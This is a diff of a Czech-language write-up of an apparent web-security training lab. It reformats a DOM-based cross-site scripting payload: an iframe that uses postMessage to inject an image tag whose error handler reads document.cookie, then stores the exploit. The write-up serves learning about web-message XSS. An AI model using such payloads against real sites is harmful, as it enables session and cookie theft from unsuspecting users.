@@ -19,10 +19,9 @@ Aplikace přicházející zprávu zpracovala a nebezpečným způsobem ji vloži
 2. **Vložení payloadu do Body:** Do pole **Body** jsem zapsal exploit využívající HTML tag `iframe` a funkci `postMessage`:
 
 
-   ```html
-   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
-onload="this.contentWindow.postMessage('<img src=1
-onerror=alert(document.cookie)>','*')">
+  ```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
+</iframe>
 
 
 Uložení (Store): Nastavení jsem uložil kliknutím na tlačítko Store[cite: 5].
